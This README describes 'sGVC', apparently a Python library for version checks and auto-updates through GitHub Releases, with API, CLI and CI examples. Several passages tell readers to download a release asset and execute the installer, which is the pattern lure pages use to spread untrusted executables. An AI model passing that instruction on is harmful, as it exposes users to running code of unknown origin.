# sGVC: Simple GitHub Version Control for Python Applications 🚀

[![Releases](https://img.shields.io/github/v/release/TOCcloud/sGVC?label=Releases&color=2b7bb9)](https://github.com/TOCcloud/sGVC/releases)

[![Python](https://img.shields.io/badge/Python-3.7%2B-blue)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/TOCcloud/sGVC/blob/main/LICENSE)
[![Topics](https://img.shields.io/badge/topics-continuous--deployment%20%7C%20github--api%20%7C%20semantic--versioning-lightgrey)](https://github.com/TOCcloud/sGVC)

![Git + Python](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png) ![Python Logo](https://www.python.org/static/community_logos/python-logo.png)

A compact Python library that manages app versions with GitHub Releases. It enforces semantic versioning, tracks history, and supports in-app update checks and automated update flows.

Features
- Semantic version parsing and comparison (SemVer 2.0.0).
- Release discovery via the GitHub Releases API.
- Auto-update workflow (download release asset, verify, replace).
- Version history tracking and local changelog cache.
- Lightweight API for CLI and embed use.
- Hooks for CI/CD and deployment automation.
- Secure downloads with checksum verification.

Badges and repo topics
- continuous-deployment
- github-api
- github-releases
- open-source
- python
- python-library
- release-management
- semantic-versioning
- software-deployment
- software-versioning
- update-manager
- version-control

Quick link
- Visit the releases page to get packages: https://github.com/TOCcloud/sGVC/releases  
  Download a release asset file from that page and execute the packaged installer or wheel to install sGVC into your environment.

Why sGVC
- You control version flow from GitHub Releases.
- You avoid shipping a full update server.
- You keep a clear audit trail using GitHub metadata.
- You script update policies in Python code.

Getting started

Requirements
- Python 3.7 or newer.
- Requests library or an HTTP client (sGVC bundles requests if not present).
- Access token for private repos (optional).

Install via PyPI (recommended)
- pip install sGVC

Install from a downloaded release
- Download the release asset from https://github.com/TOCcloud/sGVC/releases. The assets include .whl and .tar.gz builds.
- Run installer or pip on the file you downloaded:
  - pip install sGVC-<version>-py3-none-any.whl
  - or python -m pip install sGVC-<version>.tar.gz

Usage quickstart

Basic in-app check
```python
from sgvc import Client

client = Client(repo="TOCcloud/sGVC")   # repo owner/name
current = "1.0.0"

# Check for newer release
release = client.check_for_update(current_version=current)
if release:
    print(f"New release {release.tag_name} available")
    # download and apply
    asset_path = client.download_asset(release, asset_name_contains="whl")
    client.apply_update(asset_path)
```

Simple CLI
```bash
# check current install and fetch updates
python -m sgvc --repo TOCcloud/sGVC --check --apply
```

Core concepts

Client
- Client(repo, token=None, cache_dir=None, strategy="stable")
- Methods:
  - get_latest_release() -> Release
  - list_releases(limit=10) -> [Release]
  - check_for_update(current_version) -> Release | None
  - download_asset(release, asset_name_contains=None) -> str (file path)
  - verify_asset(path, checksum) -> bool
  - apply_update(path, backup=True) -> bool

Release object
- tag_name: "v1.2.3"
- name: "Release title"
- body: changelog text
- assets: list of assets (name, url, size, checksum)
- published_at: ISO timestamp

Semantic versioning
- sGVC parses SemVer major.minor.patch with optional pre-release and build metadata.
- The client compares versions with precedence rules from SemVer 2.0.0.
- The strategy param controls allowed updates:
  - stable: only non-pre-release higher versions.
  - minor: allow minor and patch bumps.
  - patch: allow patch bumps only.
  - allow-prerelease: allow pre-release versions.

Auto-update flow
1. Client checks GitHub Releases for a higher version.
2. If a release matches policy, client downloads the preferred asset.
3. Client verifies checksum or digital signature if provided.
4. Client applies update by replacing application files or running installer.
5. Client logs previous version in a local history store.

History and changelogs
- sGVC caches release metadata in a local SQLite file.
- It records timestamped entries per update attempt.
- You can query the history with client.history(limit=50)

Security
- sGVC supports SHA256 checksums published in release assets or the release body.
- When a token is required for private assets, the client uses it in Authorization headers.
- The client will refuse to apply an asset that fails checksum verification.

Advanced usage

CI/CD integration
- Use sGVC to generate release notes and create release tags as part of the pipeline.
- Example GitHub Actions step to create a release:
```yaml
- name: Create Release
  uses: actions/create-release@v1
  with:
    tag_name: v${{ github.run_number }}
    release_name: Release ${{ github.run_number }}
- name: Upload Asset
  uses: softprops/action-gh-release@v1
  with:
    files: dist/*
```

Automated update trigger inside app
- Add a background worker that calls client.check_for_update periodically.
- Send a notification to users when a new release arrives.
- Auto-download on consent and apply on next restart.

Command-line reference

Main CLI options
- --repo owner/name
- --token TOKEN
- --check    # check available release
- --apply    # download and apply
- --list     # list latest releases
- --history  # show local history

Examples
- Check without applying:
  - python -m sgvc --repo TOCcloud/sGVC --check
- Apply if update available:
  - python -m sgvc --repo TOCcloud/sGVC --check --apply

Testing and local development

Run tests
- git clone https://github.com/TOCcloud/sGVC.git
- cd sGVC
- python -m venv .venv
- source .venv/bin/activate
- pip install -r tests/requirements.txt
- pytest

Development notes
- The project uses pytest and flake8.
- The code aims for small modules and clear function boundaries.
- The API focuses on predictable behavior for update operations.

Downloads and releases
- The releases page lists build artifacts and installers: https://github.com/TOCcloud/sGVC/releases  
  Download the release asset file you need and execute the installer or install the wheel to add sGVC to your environment.

Examples and recipes

Embed update check into Flask app
```python
from flask import Flask
from sgvc import Client
app = Flask(__name__)
client = Client(repo="TOCcloud/sGVC")

@app.route("/check-update")
def check_update():
    release = client.check_for_update(current_version="1.0.0")
    if release:
        return {"update": True, "version": release.tag_name, "notes": release.body}
    return {"update": False}
```

Use in desktop app packaging
- For simple desktop apps packaged with PyInstaller, sGVC can download a new wheel or zip, unpack in a staging folder, validate, and swap the executable on next launch.

Contributing

How to contribute
- Fork the repo.
- Create a feature branch.
- Run tests locally.
- Open a pull request with a short description and test cases.

Development guidelines
- Aim for single responsibility functions.
- Keep network calls encapsulated for easy mocking.
- Add tests for edge cases in version comparison.

Roadmap
- Plugin support for custom installers.
- Delta updates to reduce download size.
- Signed release verification with GPG keys.

Support and contact
- Open issues on GitHub for bugs and feature requests.
- Use PRs for code changes.

License
- MIT License. See LICENSE file in the repository.

Acknowledgments and resources
- GitHub Releases API: https://docs.github.com/en/rest/releases
- Semantic Versioning: https://semver.org/
- Python packaging guide: https://packaging.python.org/

Assets and images
- GitHub mark: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png
- Python logo: https://www.python.org/static/community_logos/python-logo.png
- Shields: https://img.shields.io

Contact and repository
- Repository: https://github.com/TOCcloud/sGVC
- Releases: https://github.com/TOCcloud/sGVC/releases

Links in this README point to the releases page. Download a release asset from that page and execute the package you need to install or update sGVC.